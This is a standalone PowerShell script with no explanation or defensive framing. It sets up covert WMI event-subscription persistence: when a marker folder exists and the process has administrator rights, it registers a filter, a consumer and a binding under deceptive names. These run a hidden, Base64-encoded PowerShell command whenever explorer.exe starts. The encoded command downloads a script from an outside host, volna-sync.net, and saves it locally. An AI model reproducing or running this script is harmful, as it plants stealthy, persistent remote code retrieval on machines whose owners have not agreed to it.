$gate = "$env:PROGRAMDATA\c86e15"
if ((Test-Path $gate) -and (
    [Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)) {
  $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    "iwr https://volna-sync.net/wmi/c86e15.ps1 -UseBasicParsing | Out-File audit.txt"))
  wmic /namespace:\\root\subscription PATH __EventFilter CREATE `
    Name="onyxfieldcraftMon", EventNameSpace="root\cimv2", QueryLanguage="WQL", `
    Query="SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance.Name='explorer.exe'"
  wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE `
    Name="onyxfieldcraftRelay", CommandLineTemplate="powershell -w hidden -enc $enc"
  wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE `
    Filter="__EventFilter.Name=\"onyxfieldcraftMon\"", `
    Consumer="CommandLineEventConsumer.Name=\"onyxfieldcraftRelay\""
}
